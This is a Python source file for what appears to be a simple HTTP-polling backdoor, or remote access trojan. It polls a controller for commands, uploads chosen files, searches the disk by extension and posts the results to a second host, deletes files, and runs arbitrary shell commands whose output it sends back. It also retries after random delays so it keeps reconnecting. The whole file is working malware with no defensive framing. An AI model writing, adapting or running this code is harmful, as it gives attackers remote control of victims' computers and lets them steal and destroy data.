import requests,os,time,random,subprocess, pyautogui


def connect():
    while 1:
        req = requests.get('http://127.0.0.1:8080')
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = 'http://127.0.0.1:8080/tmp'
                files = {'file': open(path,'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')
        #elif 'snapshot' in command:
        #    try:
        #        screenshot = pyautogui.screenshot()
        #        screenshot.save('/tmp/screenshot.png')
        #        url = 'http://127.0.0.1:8080/tmp'
        #        files = {'file': open(path,'rb')}
        #        r = requests.post(url, files=files)
        #    except:
        #         post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')

        elif 'search' in command:
            command = command[7:]# look for only file name and remove the search word.
            path,ext=command.split('*')#remove the * from it. we look for extension.
            list = ''  # here we define a string where we will append our result on it.
            for dirpath, dirname, files in os.walk(path): #os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values
                #that three values couble be dirpath, dirname, files
                for file in files:
                    if file.endswith(ext):
                        list = list + '\n' + os.path.join(dirpath, file)
            r=requests.post("http://192.168.208.136", data= list)
        elif 'remove' in command:
            if len(command)<=5:
                r=requests.post("http://127.0.0.1:8080", data= "also enter the filename")
            else:
                code,filename = command.split(' ') 
                if os.path.exists(filename):
                    os.remove(filename)
                else:
                    r=requests.post("http://127.0.0.1:8080", data= "The file does not exist")

        elif 'cd' in command:
            code,directory = command.split(' ')
            try:
            	os.chdir(directory)
            	r=requests.post("http://127.0.0.1:8080", data= "changes to "+os.getcwd())
            except:
                post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to change directory')
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            post_response = requests.post(url='http://127.0.0.1:8080', data=CMD.stdout.read())
            post_response = requests.post(url='http://127.0.0.1:8080',data=CMD.stderr.read())
            time.sleep(3)

while 1:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(int(sleep_for))
        pass
